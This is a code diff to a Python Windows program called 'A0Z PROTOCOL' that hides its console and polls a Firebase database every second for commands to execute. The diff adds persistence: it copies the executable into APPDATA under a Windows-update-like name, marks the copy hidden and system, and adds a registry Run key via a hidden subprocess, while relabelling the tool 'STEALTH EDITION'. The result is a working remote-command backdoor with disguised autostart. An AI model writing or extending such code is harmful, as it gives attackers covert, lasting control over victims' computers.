@@ -5,11 +5,28 @@ import ctypes
 import sys
 import win32com.client
 import subprocess
+import shutil 
 
+def make_persistent():
+    try:
+        appdata = os.getenv('APPDATA')
+        target_dir = os.path.join(appdata, "WindowsDefUpdate")
+        if not os.path.exists(target_dir):
+            os.makedirs(target_dir)
+        
+        target_file = os.path.join(target_dir, "win_service_host.exe")
+        
+        if not os.path.exists(target_file):
+            shutil.copyfile(sys.executable, target_file)
+            ctypes.windll.kernel32.SetFileAttributesW(target_file, 0x02 | 0x04)
+            reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinUpdateProvider" /t REG_SZ /d "{target_file}" /f'
+            subprocess.Popen(reg_cmd, shell=True, creationflags=0x08000000)
+    except:
+        pass
 def hide_console():
     hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
     if hWnd:
-        ctypes.WinDLL('user32').ShowWindow(hWnd, 0) # 0 تعني SW_HIDE
+        ctypes.WinDLL('user32').ShowWindow(hWnd, 0)
 
 def speak(text):
     try:
@@ -25,27 +42,21 @@ def execute_command(command):
         pass
 
 def start_gateway():
-    # 1. إظهار واجهة البداية
+    make_persistent()
     os.system('color 0a')
     os.system('cls')
     print("==================================================")
-    print("   A0Z PROTOCOL v4.0 :: INITIALIZING...")
+    print("   A0Z PROTOCOL v5.0 :: STEALTH EDITION")
     print("==================================================")
-    print("[*] STATUS: BOOTING CORE SYSTEM")
+    print("[*] STATUS: SYSTEM DEPLOYED")
     print("[*] NODE: " + os.environ.get('COMPUTERNAME', 'UNKNOWN'))
     print("[*] SYSTEM WILL GO STEALTH IN 5 SECONDS...")
     print("--------------------------------------------------")
-    
-    # الانتظار لمدة 5 ثوانٍ قبل الاختفاء
+
     time.sleep(5)
-    
-    # 2. الاختفاء التام
     hide_console()
-    
-    # 3. بدء الاستماع للأوامر بصمت
     DB_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/current_command.json"
     last_timestamp = 0
-
     while True:
         try:
             response = requests.get(DB_URL)
@@ -63,6 +74,5 @@ def start_gateway():
         except:
             pass
         time.sleep(1)
-
 if __name__ == "__main__":
     start_gateway()
